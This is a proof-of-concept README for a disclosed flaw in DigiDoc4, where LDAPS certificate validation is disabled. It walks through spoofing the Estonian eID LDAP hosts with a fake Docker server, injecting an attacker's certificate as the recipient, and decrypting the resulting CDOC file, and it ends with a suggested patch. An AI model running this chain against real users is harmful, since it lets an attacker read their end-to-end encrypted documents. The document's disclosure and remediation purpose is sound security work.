# PoC H1 — LDAPS without certificate validation

Local stand to verify the vulnerability in `client/LdapSearch.cpp:126`:

```cpp
int cert_flag = LDAP_OPT_X_TLS_NEVER;
ldap_set_option(nullptr, LDAP_OPT_X_TLS_REQUIRE_CERT, &cert_flag);
```

This line globally disables TLS peer certificate validation for LDAPS
connections to `esteid.ldap.sk.ee`, `k3.ldap.sk.ee`, and
`ldap.eidpki.ee`. An on-path attacker can substitute the recipient
certificate during CDOC encryption.

## Threat model

On-path attacker (LAN, evil Wi-Fi, malicious DNS, corporate TLS-proxy,
ISP). Not RCE, but critical for an application that handles
end-to-end encrypted documents for ~1.3M Estonian eID users.

## What the stand does

```
┌──────────────────┐    TLS (self-signed)    ┌──────────────────────┐
│ DigiDoc4 (host)  │ ──────────────────────► │ fake-ldap (Docker)   │
│ searches Mallory │   /etc/hosts → 127.0.0.1│ ldaptor + Twisted    │
│ accepts any TLS  │ ◄──────────────────────│ returns mallory.cer  │
│ cert (the bug)   │  userCertificate;binary │ as recipient         │
└──────────────────┘                         └──────────────────────┘
```

If DigiDoc4 validated TLS, the handshake would fail on the self-signed
certificate. If the search returns results, the bug is confirmed.

## Quick start (macOS)

```bash
# 1. Generate certificates
./gen-certs.sh

# 2. Bring up the fake LDAPS server
docker compose up --build

# 3. In another terminal — DNS substitution
sudo sh -c 'echo "127.0.0.1 esteid.ldap.sk.ee k3.ldap.sk.ee ldap.eidpki.ee" >> /etc/hosts'
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder

# 4. Sanity-check (no DigiDoc4 needed)
#    (A) Must FAIL with "certificate verify failed":
LDAPTLS_REQCERT=demand ldapsearch -H ldaps://esteid.ldap.sk.ee -x -b "c=EE" "(cn=*Mallory*)"
#    (B) Must RETURN Mallory (mirrors what DigiDoc4 does):
LDAPTLS_REQCERT=never  ldapsearch -H ldaps://esteid.ldap.sk.ee -x -b "c=EE" "(cn=*Mallory*)"

# 5. Open DigiDoc4 → Crypto → Add recipient → "Mallory" → Search
#    If Mallory appears in the result list → H1 confirmed.
```

## End-to-end exploitation chain

Once Mallory is in the recipient list and the user clicks through the
"not trusted" warning, DigiDoc4 produces a `.cdoc` container.
`cdoc-tool` cannot decrypt it — it only accepts private keys from a
smartcard / PKCS#11. Hence the stand ships its own Python decryptor
for the CDOC1 format.

### One-time setup

```bash
pip3 install --user cryptography
```

### Make sure DigiDoc4 produces CDOC1, not CDOC2

The script handles **CDOC1** (XML-ENC). DigiDoc4 produces CDOC1 by
default (`CDOC2-DEFAULT = false` in
[client/Settings.cpp:30](https://github.com/open-eid/DigiDoc4-Client/blob/master/client/Settings.cpp#L30)).
If CDOC2 is enabled in your settings, turn it off:

> DigiDoc4 → Settings → General → **"Use CDOC2 format by default"** → OFF

Otherwise you get a `.cdoc2` file and the script will tell you so.

### Encrypt (via DigiDoc4)

1. Open DigiDoc4 (`Cmd+Q` first if it was running).
2. Crypto → Add files → drop in `test.txt`.
3. Continue → Add recipient → search `Mallory` → pick from list → Confirm.
4. On the "not trusted" warning — click **YES**.
5. Save as `secret.cdoc` (NOT `.cdoc2`).

### Decrypt with the attacker's private key

```bash
cd /path/to/POC-H1        # this repository
./decrypt.sh ~/Desktop/secret.cdoc
```

Expected output:
```
[+] Bulk cipher: AES-256-GCM
[+] Decrypted CEK from lock #1 (rsa-oaep-mgf1p)
[i] Locks in container: 1
[+] Container MIME: 'http://www.isi.edu/in-notes/iana/assignments/media-types/application/zip'
[+] Extracted (DDOC): decrypted/test.txt  (123 bytes)
[+] Files recovered in: decrypted/
```

Verify the recovered content matches the original byte-for-byte:

```bash
diff ~/Desktop/test.txt decrypted/test.txt && echo "✓ Plaintext recovered"
```

**This is the final artefact for the report:** the victim earnestly
encrypted a file "for Mallory", the file ended up encrypted under our
private key, and we recovered the plaintext with a single command.
Full confidentiality hijack.

### What `decrypt.py` does

- Parses the CDOC1 XML-ENC container.
- Iterates over every `<EncryptedKey>` (one per recipient lock).
- Tries RSA-PKCS1v1.5 and RSA-OAEP-SHA1 with our `mallory.key`.
- On success, decrypts the CEK, then bulk content with either
  AES-CBC (XML-ENC 1.0) or AES-GCM (XML-ENC 1.1).
- Unwraps DDOC (XML wrapper) or ZIP, or writes single-file payload.
- Fails with a clear message if the file is CDOC2 (newer format,
  requires flatbuffers handling — out of scope for this PoC).

## Cleanup

```bash
docker compose down
sudo sed -i '' '/esteid.ldap.sk.ee/d' /etc/hosts
sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder
```

## Troubleshooting

| Symptom | Fix |
|---|---|
| `bind: address already in use` on :636 | `sudo lsof -nP -iTCP:636 -sTCP:LISTEN` — find and stop |
| DigiDoc4: "Check internet connection" | `dscacheutil -q host -a name esteid.ldap.sk.ee` must return 127.0.0.1. Restart DigiDoc4 entirely (`Cmd+Q`). |
| Server logs are silent | DigiDoc4 caches the LDAP connection for ~4 min. Full app restart. |
| Inspect the traffic | `sudo tcpdump -i lo0 port 636 -A` |
| `Could not decrypt any EncryptedKey` | The file was not encrypted for Mallory (different recipient selected). Re-encrypt picking Mallory. |
| `Container is a CDOC2 container` | Turn off "Use CDOC2 format by default" in DigiDoc4 settings, re-encrypt. |

## Suggested fix

```diff
-#if 1
-    int cert_flag = LDAP_OPT_X_TLS_NEVER;
-    err = ldap_set_option(nullptr, LDAP_OPT_X_TLS_REQUIRE_CERT, &cert_flag);
-#else
-    err = ldap_set_option(nullptr, LDAP_OPT_X_TLS_CACERTFILE, "");
-#endif
+    int cert_flag = LDAP_OPT_X_TLS_DEMAND;
+    err = ldap_set_option(nullptr, LDAP_OPT_X_TLS_REQUIRE_CERT, &cert_flag);
+    // Load CA bundle from CheckConnection::sslConfiguration()
```

See `ADVISORY.txt` section 8 for full hardening recommendations
(CA bundle loading, hostname pinning, Windows code-path audit, and
hardening the downstream "untrusted chain" warning).

